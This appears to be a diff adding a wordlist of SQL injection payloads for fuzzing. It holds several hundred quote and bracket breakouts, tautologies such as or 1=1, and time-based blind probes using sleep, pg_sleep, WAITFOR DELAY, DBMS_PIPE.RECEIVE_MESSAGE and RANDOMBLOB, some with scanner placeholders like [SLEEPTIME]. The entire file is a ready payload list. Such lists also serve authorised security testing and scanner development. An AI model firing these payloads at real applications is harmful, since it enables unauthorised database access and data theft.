@@ -1,0 +1,249 @@
+"
+" && sleep(10)
+" + sleep(10)
+" AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+" AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+" AND 1=0
+" AND 1=1
+" AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+" AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+" and sleep(10)
+" or 1=0
+" or 1=1
+" WAITFOR DELAY '0:0:10'
+" | sleep(10)
+" || pg_sleep(10)
+""
+"" && sleep(10)
+"" + sleep(10)
+"" AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+"" AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+"" AND 1=0
+"" AND 1=1
+"" AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+"" AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+"" and sleep(10)
+"" or 1=0
+"" or 1=1
+"" WAITFOR DELAY '0:0:10'
+"" | sleep(10)
+"" || pg_sleep(10)
+")
+") && sleep(10)
+") + sleep(10)
+") AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+") AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+") AND 1=0
+") AND 1=1
+") AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+") AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+") and sleep(10)
+") or 1=0
+") or 1=1
+") WAITFOR DELAY '0:0:10'
+") | sleep(10)
+") || pg_sleep(10)
+"))
+")) && sleep(10)
+")) + sleep(10)
+")) AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+")) AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+")) AND 1=0
+")) AND 1=1
+")) AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+")) AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+")) and sleep(10)
+")) or 1=0
+")) or 1=1
+")) WAITFOR DELAY '0:0:10'
+")) | sleep(10)
+")) || pg_sleep(10)
+'
+' && sleep(10)
+' + sleep(10)
+' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+' AND 1=0
+' AND 1=1
+' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+' and sleep(10)
+' or 1=0
+' or 1=1
+' WAITFOR DELAY '0:0:10'
+' | sleep(10)
+' || pg_sleep(10)
+''
+'' && sleep(10)
+'' + sleep(10)
+'' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+'' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+'' AND 1=0
+'' AND 1=1
+'' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+'' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+'' and sleep(10)
+'' or 1=0
+'' or 1=1
+'' WAITFOR DELAY '0:0:10'
+'' | sleep(10)
+'' || pg_sleep(10)
+')
+') && sleep(10)
+') + sleep(10)
+') AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+') AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+') AND 1=0
+') AND 1=1
+') AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+') AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+') and sleep(10)
+') or 1=0
+') or 1=1
+') WAITFOR DELAY '0:0:10'
+') | sleep(10)
+') || pg_sleep(10)
+'))
+')) && sleep(10)
+')) + sleep(10)
+')) AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+')) AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+')) AND 1=0
+')) AND 1=1
+')) AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+')) AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+')) and sleep(10)
+')) or 1=0
+')) or 1=1
+')) WAITFOR DELAY '0:0:10'
+')) | sleep(10)
+')) || pg_sleep(10)
+(1)aND(1=1)
+(1)oR(1=1)
+-1 oR 1=1
+-1 || 1
+-1")oR"1"=("1
+-1")||"1"=("1
+-1"oR"1"="1
+-1"||"1"="1
+-1')oR'1'=('1
+-1')||'1'=('1
+-1'oR'1'='1
+-1'||'1'='1
+-1/**/oR/**/1=1
+-1`)oR`1`=(`1
+-1`)||`1`=(`1
+-1`oR`1`=`1
+-1`||`1`=`1
+-1||1
+0")+("1
+0"+"1
+0')+('1
+0'+'1
+0+1
+0`)+(`1
+0`+`1
+1
+1 & 1
+1 && 2
+1 aND 1=1
+1"
+1"%"2
+1"&"1"="1
+1"&&"2"="1
+1")%("2
+1")&"1"=("1
+1")&&"1"=("1
+1")*("1
+1")>("0
+1")aND"1"=("1
+1"*"1
+1">"0
+1"aND"1"="1
+1%2
+1&&2
+1&1
+1'
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1'%'2
+1'&&'2'='1
+1'&'1'='1
+1')%('2
+1')&&'1'=('1
+1')&'1'=('1
+1')*('1
+1')>('0
+1')aND'1'=('1
+1'*'1
+1'>'0
+1'aND'1'='1
+1*1
+1/**/aND/**/1=1
+1>0
+1`
+1`%`2
+1`&&`2`=`1
+1`&`1`=`1
+1`)%(`2
+1`)&&`1`=(`1
+1`)&`1`=(`1
+1`)*(`1
+1`)>(`0
+1`)aND`1`=(`1
+1`*`1
+1`>`0
+1`aND`1`=`1
+2")-("1
+2"-"1
+2')-('1
+2'-'1
+2-1
+2`)-(`1
+2`-`1
+`
+` && sleep(10)
+` + sleep(10)
+` AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+` AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+` AND 1=0
+` AND 1=1
+` AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+` AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+` and sleep(10)
+` or 1=0
+` or 1=1
+` WAITFOR DELAY '0:0:10'
+` | sleep(10)
+` || pg_sleep(10)
+`)
+`) && sleep(10)
+`) + sleep(10)
+`) AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+`) AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+`) AND 1=0
+`) AND 1=1
+`) AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+`) AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+`) and sleep(10)
+`) or 1=0
+`) or 1=1
+`) WAITFOR DELAY '0:0:10'
+`) | sleep(10)
+`) || pg_sleep(10)
+`))
+`)) && sleep(10)
+`)) + sleep(10)
+`)) AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+`)) AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+`)) AND 1=0
+`)) AND 1=1
+`)) AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+`)) AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+`)) and sleep(10)
+`)) or 1=0
+`)) or 1=1
+`)) WAITFOR DELAY '0:0:10'
+`)) | sleep(10)
+`)) || pg_sleep(10)
+true
